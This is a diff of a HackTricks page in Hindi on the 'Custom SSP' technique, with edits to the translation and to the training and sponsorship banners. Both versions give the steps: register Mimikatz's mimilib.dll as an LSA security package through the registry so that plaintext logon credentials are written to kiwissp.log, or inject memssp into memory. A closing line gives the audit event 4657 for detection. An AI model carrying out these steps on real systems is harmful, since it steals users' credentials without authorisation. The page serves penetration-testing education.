@@ -1,29 +1,30 @@
 # Custom SSP
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks का समर्थन करने के अन्य तरीके:
-
-* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
-* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-### कस्टम SSP
+### Custom SSP
 
-[यहाँ जानें कि SSP (सुरक्षा समर्थन प्रदाता) क्या है।](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-आप अपना **खुद का SSP** बना सकते हैं ताकि मशीन तक पहुंचने के लिए उपयोग किए गए **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** कर सकें।
+[यहाँ जानें कि SSP (सिक्योरिटी सपोर्ट प्रोवाइडर) क्या है।](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+आप **अपना खुद का SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग की जाने वाली **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** किया जा सके।
 
 #### Mimilib
 
 आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल में लॉग करेगा।**\
-`C:\Windows\System32\` में dll ड्रॉप करें\
-मौजूदा LSA सुरक्षा पैकेज की सूची प्राप्त करें:
+DLL को `C:\Windows\System32\` में डालें\
+मौजूदा LSA सुरक्षा पैकेजों की सूची प्राप्त करें:
 
 {% code title="attacker@target" %}
 ```bash
@@ -34,23 +35,36 @@ Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\
 ```
 {% endcode %}
 
-सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में `mimilib.dll` जोड़ें:
-
+`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में जोड़ें:
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-
-और एक बार पुनरारंभ के बाद सभी प्रमाण पाठ में स्पष्ट पाठ में `C:\Windows\System32\kiwissp.log` में पाए जा सकते हैं।
+और एक रिबूट के बाद सभी क्रेडेंशियल्स `C:\Windows\System32\kiwissp.log` में स्पष्ट पाठ में पाए जा सकते हैं।
 
 #### मेमोरी में
 
-आप इसे मेमोरी में सीधे Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता है):
-
+आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम न कर सकता है):
 ```powershell
 privilege::debug
 misc::memssp
 ```
+यह रिबूट को सहन नहीं करेगा।
 
-#### निवारण
+#### शमन
 
-घटना आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` के निर्माण/परिवर्तन की ऑडिट।
+इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` का ऑडिट निर्माण/परिवर्तन
+
+{% hint style="success" %}
+AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>HackTricks का समर्थन करें</summary>
+
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
+
+</details>
+{% endhint %}
